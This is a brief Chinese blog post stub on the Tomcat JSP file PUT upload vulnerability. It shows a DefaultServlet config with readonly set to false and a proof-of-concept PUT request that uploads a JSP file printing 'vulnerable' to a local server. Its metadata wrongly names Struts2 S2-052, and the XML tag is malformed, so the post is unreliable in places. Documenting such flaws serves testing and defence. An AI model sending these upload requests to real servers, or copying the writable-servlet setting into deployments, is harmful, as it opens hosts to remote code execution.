---
layout: post
title: Tomcat JSP文件PUT上传漏洞
description: "Vulnerability - Java Struts2 S2-052 and XStream"
tags: [Vulnerability,Java,Struts2,漏洞分析]
image:
  background: triangular.png
---

# 0. 概述

<web-app
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
</web-app>


POC:

PUT /cmd/test3.jsp/ HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 28

<%out.print("vulnerable");%>